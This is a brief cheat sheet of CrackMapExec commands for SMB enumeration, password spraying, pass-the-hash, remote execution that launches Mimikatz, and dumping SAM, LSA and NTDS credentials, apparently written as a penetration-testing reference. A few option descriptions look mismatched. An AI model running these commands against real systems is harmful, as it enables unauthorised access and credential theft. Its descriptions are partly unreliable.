# CrackMapExec

## Basic Usage

```bash
pip3 install crackmapexec

# Target syntax examples
crackmapexec smb 192.168.1.10 192.168.2.10-20
crackmapexec smb 192.168.1.0/24
crackmapexec smb target.txt
```

## Enumeration

```bash
# List users (anonymous or with credentials)
crackmapexec smb $IP -u '' -p '' --users
```

### Auth required (Examples)

```bash
crackmapexec smb $IP -u user -p pass --groups
```

- `--groups` : List groups
- `--shares` : List SMB shares
- `--sessions` : Check logged sessions
- `--local-admins` : Get local admins

## Credential Testing

```bash
# Test single username/password
crackmapexec smb $IP -u user -p password

# Test with NTLM hash (Pass-the-Hash)
crackmapexec smb $IP -u user -H <LMHASH>:<NTHASH>

# Password spraying with lists
crackmapexec smb $IP -u users.txt -p passwords.txt --continue-on-success
```

## Execution

```bash
# Execute command remotely (SMBExec)
crackmapexec smb $IP -u user -p pass --exec-method smbexec -x 'whoami'

# Run a script or payload
crackmapexec smb $IP -u user -p pass --exec-method smbexec -x 'powershell -nop -c "Invoke-Mimikatz"'
```

## Post-Exploitation

```bash
# Dump local SAM hashes
crackmapexec smb $IP -u user -p pass --sam
```

- `--lsa` : extract LSA secrets (including cached credentials and tokens)
- `--ntds` : dump cached domain credentials from NTDS.dit (requires high privileges)
- `--enable-rdp` : enable Remote Desktop (on the remote host)
- `--disable-uac` : disable UAC remote restrictions

## MISC

```bash
# Check domain controller info
crackmapexec smb $IP -u user -p pass --dc

# Query domain users and info
crackmapexec smb $IP -u user -p pass --pass-pol

# List logged on users on remote host
crackmapexec smb $IP -u user -p pass --loggedon-users
```
